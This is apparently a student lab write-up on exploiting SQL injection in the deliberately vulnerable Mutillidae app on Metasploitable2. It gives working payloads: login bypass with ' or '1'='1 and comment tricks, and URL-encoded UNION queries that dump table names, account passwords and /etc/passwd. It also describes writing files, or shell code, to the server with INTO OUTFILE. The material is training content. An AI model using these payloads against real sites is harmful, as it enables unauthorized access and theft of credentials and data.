# sqlinjection
Exploiting SQL Injection vulnerability

# AIM:
To exploit SQL Injection vulnerability using Multidae web application in Metasploitable2

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode


### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
SQL Injection is a sort of infusion assault that makes it conceivable to execute malicious SQL statements. These statements control a database server behind a web application. Assailants can utilize SQL Injection vulnerabilities to sidestep application safety efforts. They can circumvent authentication and authorization of a page or web application and recover the content of the whole SQL database. 
Identify IP address using ifconfig in Metasploitable2
![Screenshot 2024-05-08 180101](https://github.com/yashvanthbalaji/sqlinjection/assets/145736316/96d97aae-ac08-40e8-90f2-653f087cfffc)

Use the above ip address to access the apache webserver of Metasploitable2 from kali linux. In Kali Linux use the ip address in a web browser.
![Screenshot 2024-05-11 083126](https://github.com/yashvanthbalaji/sqlinjection/assets/145736316/39c8a92e-a76b-4ad2-86fe-a32bc3acb85c)

Select Multidae from the menu listed as shown above. You will get the page as displayed below:

![image](https://github.com/yashvanthbalaji/sqlinjection/assets/145736316/5bb3c600-d8b6-4200-868d-7cf6b5ecdd94)
Click on the menu Login/Register and register for an account
![image](https://github.com/yashvanthbalaji/sqlinjection/assets/145736316/67fe44b6-6173-405b-8979-afa730bc72e5)

Click on “Create Account” to display the following page:

![Screenshot 2024-05-10 152737](https://github.com/yashvanthbalaji/sqlinjection/assets/145736316/d905689b-1838-4604-9470-fcde8e395ff3)
The login structure we will use in our examples is straightforward. It contains two input fields (username and password), which are both vulnerable. The back-end content creates a query to approve the username and secret key given by the client. Here is an outline of the page rationale:

($query = “SELECT * FROM users WHERE username=’$_POST[username]’ AND password=’$_POST[password]’“;).
 For the username put “ganesh” or “anything” and for the password put (anything’ or ‘1’=’1) or (admin’ or ‘1’=’1) then try to log in, and you’ll be presented with an admin login page.

![Screenshot 2024-05-10 154103](https://github.com/yashvanthbalaji/sqlinjection/assets/145736316/fca4854a-48f8-4f21-8a58-a64ae2dc3f71)

Click “Login”. The logged in page will show as below:
![Screenshot 2024-05-10 154131](https://github.com/yashvanthbalaji/sqlinjection/assets/145736316/906ebf34-dc1f-4866-9ec5-9a1fa7c10d78)



##Bypassing login field

The username field is vulnerable. Put (ganesh’ #) or (ganesh’--) in the username field and hit “Enter” to log in. We use “#” or “--” to comment everything in the query sentence that comes after the username filed telling the database to disregard the password field: (SELECT * FROM users WHERE username=’admin’ # AND password=’ ‘). By using line commenting, the aggressor eliminates a part of the login condition and gains access. This technique will make the “WHERE” clause true only for one user; in this case, it is “ganesh.”

Now after logging out you will see the login page. In the login page give ganesh’ # . You can see the page now enters into the administrator page as before when giving the password. 

![Screenshot 2024-05-10 154224](https://github.com/yashvanthbalaji/sqlinjection/assets/145736316/43078c58-e84d-4da1-be20-89fc02902f2e)

Click the login button and you will see it enter into the administrator page.


## Union-based SQL injection
UNION-based SQL injection assaults enable the analyzer to extract data from the database effectively. Since the “UNION” operator must be utilized if the two inquiries have precisely the same structure, the attacker must craft a “SELECT” statement like the first inquiry. 
we will be using the “User Info” page from Mutillidae to perform a Union-Based SQL injection attack. Go to “OWASP Top 10/A1 — Injection/SQLi — Extract-Data/User Info” 

After logging out, Now choose the menu as shown below:
![Screenshot 2024-05-10 184502](https://github.com/yashvanthbalaji/sqlinjection/assets/145736316/e32fc296-84da-433c-a91c-f93ed18b324f)


![Screenshot 2024-05-10 184707](https://github.com/yashvanthbalaji/sqlinjection/assets/145736316/e9875c83-f4e6-4ddd-ac53-8ce9e6b5ee49)

From this point, all our attack vectors will be performed in the URL section of the page using the Union-Based technique.There are two different ways to discover how many columns are selected by the original query. The first is to infuse an “ORDER BY” statement indicating a column number. Given the column number specified is higher than the number of columns in the “SELECT” statement, an error will be returned.
![Screenshot 2024-05-10 185903](https://github.com/yashvanthbalaji/sqlinjection/assets/145736316/3ba959ab-e3bb-44e2-bdf0-bf6cb76d6270)

Since we do not know the number of columns, we start at 1. To find the exact amount of columns, the number is incremented until an error related to the “ORDER BY” clause is returned. In this example, we incremented it to 6 and received an error message, so it means that the number of columns is lower than 6.

The browser url of this info page need to be modified with the url as below:
http://192.168.197.62/mutillidae/index.php?page=user-info.php&username=balaji%27order%20by6%23&password=balaji1234&user-info-php-submit-button=View+Account+Details
![Screenshot 2024-05-10 185457](https://github.com/yashvanthbalaji/sqlinjection/assets/145736316/a9f41584-f9b7-48ef-89d5-e64cdff7cef5)

After adding the order by 6 into the existing url , the following error statement will be obtained:
When we ordered by 5, it worked and displayed some information. It means there are five columns that we can work with. Following screenshot shows that the url modified to have statement added with ordered by 5 replacing 6.
![Screenshot 2024-05-10 185903](https://github.com/yashvanthbalaji/sqlinjection/assets/145736316/3ba959ab-e3bb-44e2-bdf0-bf6cb76d6270)

 As it is having 5 columns the query worked fine and it provides the correct result

![Screenshot 2024-05-10 184707](https://github.com/yashvanthbalaji/sqlinjection/assets/145736316/e9875c83-f4e6-4ddd-ac53-8ce9e6b5ee49)

Instead of using the "order by" option, let’s use the "union select" option and provide all five columns. Ex: (union select 1,2,3,4,5)
![Screenshot 2024-05-10 190103](https://github.com/yashvanthbalaji/sqlinjection/assets/145736316/e3758b8c-95be-4476-bf92-185020bd8aeb)

As given in the screenshot below columns 2,3,4 are usable in which we can substitute any sql commands to extract necessary information.
![Screenshot 2024-05-10 190129](https://github.com/yashvanthbalaji/sqlinjection/assets/145736316/8fa8d5a7-6ad5-47ab-8a78-d4a5f887504d)
Now we will substitute some few commands like database(), user(), version() to obtain the information regarding the database name, username and version of the database.
http://192.168.197.62/mutillidae/index.php?page=user-info.php&username=vinothini%27union%20select%201,database(),user(),version(),5%23&password=balaji1234&user-info-php-submit-button=View+Account+Details

![Screenshot 2024-05-10 190425](https://github.com/yashvanthbalaji/sqlinjection/assets/145736316/ecdea388-621c-4dc7-99c0-7930a7ea9bf8)

The url when executed, we obtain the necessary information about the database name owasp10, username as root@localhost and version as 5.0.51a-3ubuntu5.
In MySQL, the table “information_schema.tables” contains all the metadata identified with table items. Below is listed the most useful information on this table.

Replace the query in the url with the following one:
union select 1,table_name,null,null,5 from information_schema.tables where table_schema = ‘owasp10’


http://192.168.197.62/mutillidae/index.php?page=user-info.php&username=balaji%27union%20select%201,table_name,null,null,5%20from%20information_schema.tables%20where%20table_schema=%27owasp10%27%23&password=balaji1234&user-info-php-submit-button=View+Account+Details
![Screenshot 2024-05-10 192136](https://github.com/yashvanthbalaji/sqlinjection/assets/145736316/03faa153-61f5-4862-9d36-5349a4a7567b)

The url once executed will  retrieve table names from the “owasp 10” database.
##Extracting sensitive data such as passwords 

When the attacker knows table names, he needs to discover what the column names are to extract data.

In MySQL, the table “information_schema.columns” gives data about columns in tables. One of the most useful columns to extract is called “column_name.”

Ex: (union select 1,colunm_name,null,null,5 from information_schema.columns where table_name = ‘accounts’).

Here we are trying to extract column names from the “accounts” table.
The column names of the accounts is displayed below for the following url:
http://192.168.197.62/mutillidae/index.php?page=user-info.php&username=balaji%27union%20select%201,column_name,null,null,5%20from%20information_schema.columns%20where%20table_name=%27accounts%27%23&password=balaji1234&user-info-php-submit-button=View+Account+Details 

![Screenshot 2024-05-10 192427](https://github.com/yashvanthbalaji/sqlinjection/assets/145736316/1e600e4e-cc24-46c4-97d4-85dafc37e5ad)



Once we discovered all available column names, we can extract information from them by just adding those column names in our query sentence.

Ex: (union select 1,username,password,is_admin,5 from accounts).

http://192.168.197.62/mutillidae/index.php?page=user-info.php&username=balaji%27union%20select%201,username,password,is_admin,5%20from%20accounts%23&password=balaji1234&user-info-php-submit-button=View+Account+Details


![Screenshot 2024-05-10 192621](https://github.com/yashvanthbalaji/sqlinjection/assets/145736316/1ce121ab-3ac3-41dc-974d-e9ae64532695)

## Reading and writing files on the web-server
We can use the “LOAD_FILE()” operator to peruse the contents of any file contained within the web-server. We will typically check for the “/etc/password” file to see if we get lucky and scoop usernames and passwords to possible use in brute force attacks later.

Ex: (union select null,load_file(‘/etc/passwd’),null,null,null).
http://192.168.197.62/mutillidae/index.php?page=user-info.php&username=balaji%27union%20select%20null,load_file(%27/etc/passwd%27),null,null,null%23&password=balaji1234&user-info-php-submit-button=View+Account+Details

![Screenshot 2024-05-10 192735](https://github.com/yashvanthbalaji/sqlinjection/assets/145736316/a224d1dc-c4a9-46eb-9dbe-934202d5eeea)

the “INTO_OUTFILE()” operator for all that they offer and attempt to root the objective server by transferring a shell-code through SQL infusion. we will write a “Hello World!” sentence and output it in the “/tmp/” directory as a “hello.txt” file. This “Hello World!” sentence can be substituted with any PHP shell-code that you want to execute in the target server.
Ex: (union select null,’Hello World!’,null,null,null into outfile ‘/tmp/hello.txt’).



## RESULT:
The SQL Injection vulnerability is successfully exploited using the Multidae web application in Metasploitable2.
